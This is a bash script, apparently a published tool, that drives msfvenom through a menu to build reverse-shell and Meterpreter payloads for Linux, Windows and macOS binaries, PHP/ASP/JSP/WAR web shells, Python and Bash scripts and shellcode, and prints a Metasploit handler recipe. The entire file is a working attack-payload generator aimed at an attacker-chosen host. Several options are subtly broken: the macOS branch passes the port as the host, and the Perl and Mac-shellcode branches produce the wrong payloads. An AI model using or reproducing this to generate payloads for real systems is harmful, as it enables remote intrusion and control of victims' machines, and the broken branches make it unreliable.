#!/bin/bash
COWSAY=/usr/games/cowsay
function banner() {
if [ -f "$COWSAY" ] 
then
cowsay -f eyes MSFVENOM Payload Crafter
else
echo "
╔╦╗╔═╗╔═╗  ╦  ╦┌─┐┌┐┌╔═╗┌┬┐
║║║╚═╗╠╣───╚╗╔╝├┤ │││║ ║│││
╩ ╩╚═╝╚     ╚╝ └─┘┘└┘╚═╝┴ ┴
"
echo "Github:https://github.com/Fonderelite"
fi
}

function payload() {
echo "❓Options❓
Option1:Binaries[0]
==================
Option2:Windows[1]
==================
Option3:Mac[2]
==================
Option4:WebPayloads[3]
==================
Option5:Scripting-Payloads[4]
==================
Option6:ShellCodes[5]
==================
Option7:Handlers[6]
==================
"

read -p "Choice~: " choice
if [[ $choice -eq 0 ]];then
echo "Binary Payload
======================
"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output file-name(file.elf)~: " output
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $output
if [ -f "$output" ] 
then
echo "Payload saved as $output" 
fi

elif [ "$choice" -eq 1 ]
then
echo "Windows Payload
======================
"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output file-name(file.exe)~: " output_win
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $output_win
if [ -f "$output_win" ]
then echo "Payload saved as $output_win" 
fi

elif [ "$choice" -eq 2 ] 
then
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output file-name(file.macho)~: " output_mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$port LPORT=$port -f macho > $output_mac
elif [ "$choice" -eq 3 ]
then
echo "Web-Payloads"
echo "
Options:
Option 1:PHP[0]
===============
Option 2:ASP[1]
===============
Option 3:JSP[2]
===============
Option 4:WAR[3]
===============
"
read -p "Option~: " option 
case $option in
0)
echo "PHP Reverse-Shell Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.php)~: " outputphp
msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputphp
cat $outputphp | pbcopy && echo '<?php ' | tr -d '\n' > $outputphp && pbpaste >> $outputphp
;;
1)
echo "ASP Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.asp)~: " outputasp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $outputasp
;;

2)
echo "JSP Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.jsp)~: " outputjsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputjsp
;;

3)
echo "WAR Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.war)~: " outputwar
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputwar
;;
esac

elif [ "$choice" -eq 4 ]
then
echo "Options: 
Option 1:Python[0]
===============
Option 2:Bash[1]
===============
Option 3:Perl[2]
===============
"
read -p "Option~: " option4
case $option4 in
0)
echo  "Python Reverse-Shell"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.py)~: " outputpy
msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > $outputpy
;;
1)
echo "Bash Shell Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.sh)~: " outputsh
msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputsh
;;
2)
echo "Perl Shell Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.sh)~: " outputpl
msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputpl
;;
esac

elif [ "$choice" -eq 5 ]
then
echo "Options:
Option 1:Linux-Based Shellcode[0]
==================================
Option 2:Windows-Based Shellcode[1]
==================================
Option 3:MAC-Based Shellcode[2]
==================================
"
read -p "Option~: " option5
case $option5 in
0)
echo "Linux-Based Shellcode"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Language(ex. py): " lang
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang
;;
1)
echo "Windows Based Shellcode"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Language(ex. py): " lang1
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang1
;;

2)
echo "Mac Based Shellcode"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Language(ex. py): " lang2
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang2
;;
esac

elif [ "$choice" -eq 6 ]
then
echo "
Metasploit Handler Guide
=========================
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
"
read -p "Do you wish to start Metasploit(y=1/n=0)~: " yon
if [ "$yon" -eq 1 ]
then
msfconsole
elif [[ "$yon" -eq 0 ]];then
echo "Exiting..."
sleep 1.5
exit
fi
elif [ -z $ip ]
then
echo "Invalid Option!"
fi
}
function main() {
banner
payload
}
main
